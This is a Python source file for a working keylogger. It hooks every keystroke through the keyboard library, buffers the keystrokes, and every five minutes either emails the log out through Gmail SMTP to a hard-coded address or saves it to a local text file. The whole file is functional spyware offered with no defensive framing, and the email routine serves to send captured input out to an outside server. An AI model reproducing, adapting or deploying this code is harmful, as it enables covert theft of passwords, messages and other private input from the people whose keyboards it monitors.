import keyboard
import smtplib

from threading import Timer
from datetime import datetime
import os

os.chdir("C:/Users/kuyik/Documents/keylogger")
print('path', os.getcwd())

SEND_REPORT_EVERT = 300 #this is the total amount of time it will take for a single keylogeer file to either be saved or sent to the destination email or folder
EMAIL_ADDRESS = 'kuyikbrown@gmail.com' # THE email account of the reciver of the info
EMAIL_PASSWORD = '' #receiver password

class KEylogger:
    def __init__(self, interval, report_method='email'):
        self.interval = interval
        self.report_method = report_method
        self.log = ' '
        self.start_id = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[enter]\n'
            elif name == 'decimal':
                name = '.'
            elif name == 'tab':
                name= '\n\n[next tab]'
            else:
                name = name.replace(' ', '_')
                name = f'[{name}]'.capitalize()
        self.log +=name
    
    def update_filename(self):
        start_dt_str = str(self.start_id)[:-7].replace(' ', '-').replace(':', ' ')
        end_dt_str = str(self.end_dt)[:-7].replace(' ', '-').replace(':', ' ')
        self.filename = f'keylog of from {start_dt_str} to {end_dt_str}'
    
    def report_to_file(self):
        with open(f'{self.filename}.txt', 'w') as fi:
            print(self.log, file=fi)
        print(f'[+] saved {self.filename}.txt')

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port = 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    


    def report(self):

        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method =='email':
                self.send_mail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == 'file':
                self.report_to_file()
            # FOR COMMAND LINE PRINTING UNCOMMENT BELOW
            print(f'[{self.filename} -- {self.log}]')
            self.start_id = datetime.now()
        self.log = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_id = datetime.now()
        keyboard.on_release(callback = self.callback)
        self.report()
        print(f'{datetime.now()} - started keylogger')
        keyboard.wait()

if __name__=='__main__':
    keylogger = KEylogger(interval=SEND_REPORT_EVERT, report_method='file')
    keylogger.start()
        